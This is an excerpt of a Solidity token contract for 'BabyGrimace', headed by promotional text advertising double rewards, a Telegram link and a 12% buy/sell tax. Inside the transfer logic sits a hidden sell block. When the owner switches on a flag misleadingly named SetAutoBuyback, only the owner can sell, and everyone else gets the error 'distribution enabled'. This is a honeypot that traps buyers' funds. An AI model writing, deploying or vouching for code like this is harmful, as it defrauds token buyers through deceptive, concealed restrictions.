...
Hold BabyGrimace, Earn Grimace & UNIV, double reward !

https://t.me/BabyGrimace

12% buys/sells

UNIV CA (REWARDS) :    0x959b88966fC5B261dF8359961357d34F4ee27b4a
GRIMACE CA (REWARDS) : 0x6760f9fb100369810A1e12f59B7164C1deD7f271
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0x6760f9fb100369810A1e12f59B7164C1deD7f271); // GrimaceCoin
...
contract BABYGRIMACE is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0x6760f9fb100369810A1e12f59B7164C1deD7f271; // GrimaceCoin
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "BabyGrimace";
    string constant _symbol = "BabyGrimace";
    ...
    address public autoLiquidityReceiver=0x9d876fB0eE756e035df811333A98278e79C376Dc;
    address public marketingFeeReceiver=0x9d876fB0eE756e035df811333A98278e79C376Dc;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (isSell) {
            require((!EnableAutoBuyback || sender==owner), "distribution enabled");
    ...
    function SetAutoBuyback(bool value) external onlyOwner {
        EnableAutoBuyback = value;
    }
